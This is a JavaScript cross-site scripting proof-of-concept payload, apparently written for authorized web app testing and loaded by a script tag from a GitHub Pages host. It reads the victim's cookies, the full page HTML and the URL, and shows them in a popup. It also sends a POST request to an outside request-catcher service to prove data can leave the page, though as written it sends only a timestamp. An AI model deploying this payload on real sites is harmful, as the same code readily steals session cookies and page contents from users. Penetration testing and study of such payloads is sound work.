//Authoer: JDL
//<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 

//Update Title for confirmation script loaded
//We're not trying to be surreptitious about the app testing
document.title = "XSS-Active"

//APP SPECIFIC 
//Put Back the variable used to invoke the XSS
var websession  = '1';
var mysessionno  = '1';
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;
//////////

//Get Secrets for display 
var UsersCookie = document.cookie;
var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
var DocLocation = document.location.href;


var Toilet = "http://ptsv2.com/t/qo33d-1598654477";

function ExfiltrateData(ID)
{	
	 //The popup proves we can obtain the data. 
	 //Now we need to prove we can move it else where.
	 //We can't post anything that would indentify the application we've used this script against. 
	 //ID is the current Timestamp in MS. 	 
	 //Send Request to Toilet - Thirdparty POST catcher. 
	 const xhr = new XMLHttpRequest();
	 xhr.open("POST", Toilet+"/post", true);
	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 xhr.send("XSS-TEST-"+ID);	
}

function createPopup(){
var TextAreaStyle = "margin-left:0px;margin-right:0px;background:rgb(79, 79, 79);";
var popup = open("", "", "width=800,height=600,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
popup.document.body.style.background = "rgb(53, 53, 53)";
//Cookie Doc Header
var hCookie = popup.document.createElement("h4");
hCookie.style = "color:fff;";
hCookie.innerHTML = "Document Cookie";
popup.document.body.appendChild(hCookie);
popup.document.title = "XSS Data";
//Cookie Doc
var txtCookie = popup.document.createElement("TEXTAREA");
txtCookie.innerHTML = UsersCookie;
txtCookie.style = "width:100%;height:150px;"+TextAreaStyle;
popup.document.body.appendChild(txtCookie);

//Doc Header
var hDocumentInner = popup.document.createElement("h4");
hDocumentInner.style = "color:fff;";
hDocumentInner.innerHTML = "Document Inneer HTML";
popup.document.body.appendChild(hDocumentInner);
//Cookie Doc
var txtDocumentInner = popup.document.createElement("TEXTAREA");
txtDocumentInner.innerHTML = DocHTML;
txtDocumentInner.style = "width:100%;height:150px;"+TextAreaStyle;
popup.document.body.appendChild(txtDocumentInner);

//URL Header
var hURLInner = popup.document.createElement("h4");
hURLInner.style = "color:fff;";
hURLInner.innerHTML = "Document Location";
popup.document.body.appendChild(hURLInner);
//URL Doc
var txtURLInner = popup.document.createElement("TEXTAREA");
txtURLInner.innerHTML = DocLocation;
txtURLInner.style = "width:100%;height:20px;"+TextAreaStyle;
popup.document.body.appendChild(txtURLInner);

//ExfiltrateData
var aExData = popup.document.createElement("a");
aExData.style = "color:fff;";
aExData.innerHTML = "Was this data exfiltrated to external source?";
aExData.href = Toilet;
aExData.target="_blank";
popup.document.body.appendChild(aExData);

}

ExfiltrateData(TimeAsMS);
createPopup();
